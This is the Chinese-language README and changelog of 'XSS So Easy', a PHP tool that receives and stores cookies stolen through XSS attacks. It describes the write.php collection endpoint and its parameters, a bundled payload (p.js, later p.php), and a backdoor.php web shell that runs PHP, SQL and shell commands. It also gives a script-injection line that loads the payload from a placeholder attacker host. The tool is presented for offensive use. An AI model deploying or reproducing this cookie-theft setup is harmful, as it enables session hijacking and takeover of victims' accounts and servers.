# XSS So Easy

## 简介

此网站用于 XSS Cookie 劫持攻击中接收并储存 Cookie。

程序语言使用 PHP，使用 PDO 扩展，请根据数据库正确安装；开发环境使用 MySQL 数据库，理论上 PDO 扩展支持各种数据库。

## 使用方法

### 安装配置

1. 建议预先新建数据库用户，赋予最小权限。
2. 配置 `config.php`，填写数据库用户名、密码等信息。
3. 访问 `install.php`：创建数据库、表等操作。
4. 建议更改 `config.php` 文件权限为只能被 HTTP 服务程序读取，可以设置 `style/color.css` 可写。

### 使用

通过 `write.php`，`GET` 或者 `POST` 方法传输获取到的 Cookie。

可供提交的参数为 `domain` `location` `toplocation` `cookie` `opener`。其中 `domain` 必填。

含有 payload：`p.php`。

## 附加功能

- 各个页面的独立访问密码
- 自定义网站名称（`title` 和页面中显示）
- 自定义开发者信息（底部显示）

## Update

### 2015-9-12 21:05:48

一条不当的 payload，使数据库里多了几百条垃圾数据。于是我写了执行 SQL 语句的 `backdoor.php`（支持密码）。

### 2015-9-16 10:44:21

- 自我感觉默认配置的颜色过于小清新。于是分离出 `color.css` 文件，可以自行配置颜色。
- 出于复（xián）习（de）知（dàn）识（téng）的目的，做了个 `color.php`，向 `color.css` 写入数据。
- 后门支持 PHP、SQL、Shell 命令执行，且支持 SQL `SELECT` 命令结果显示。SQL 的 `INSERT` `UPDATE` `DELETE` 影响行数显示。（突然发现做了个 WebShell）
- 输出表格增加 `\n` 使 HTML 源文件易读。
- 由于空字符串在 `if` 语句中效果同 `false`，因此 `system()` 返回最后一行为空时应使用 `if($foo !== FALSE)`。其他情况同理。
- 改变字体为等宽字体。个别地方，中文使用微软雅黑。
- 使用 Eclipse 排版一下。其他一些细节调整优化。

### 2015-9-16 22:25:33

- CSS 文件已改为 PHP 文件读写。
- 在 Windows 上运行系统命令时输出字符集为 `GBK`，增加自动转换为 `UTF-8`。

### 2015-9-21 21:26:59

- 密码验证方式由 `GET` 改为 `POST`，并增加 `install` 和 `testMySql` 页面密码功能
- 分离出 CSS 文件，并移动到 `style/main.css`
- 增加 `read.php` 条件查询

### 2015-10-20 15:45:32

修改数据库，更改 `url` 字段名为 `location` 并允许 `NULL`，增加 `toplocation`（用于框架）、`opener`。

**从旧的数据库变更请在 `backdoor.php` 执行 SQL 命令**：

```sql
alter table info change url location longtext NULL
alter table info add toplocation longtext
alter table info modify column cookie longtext after toplocation
alter table info add opener longtext
describe info
```

增加 `p.js` 作为 payload，修改内部 `write.php` 域名和路径即可使用。

```html
<script src=http://xxx.xxx/p.js></script>
```

### 2015-11-19 21:43:46

近期更新：

- `read.php` 默认的倒序排序，增加删除键，调整样式
- 改进 `backdoor.php` 交互设计

### 2016-8-25

- 从已废弃的 `mysql_connect()` 系列函数更新到 PDO 扩展。
- 大量改进代码：验证密码部分整合成模块，payload `p.js` 改为 `p.php`,根据 `config.php` 动态生成。
- `color.php` 将 CSS 数据与代码分离
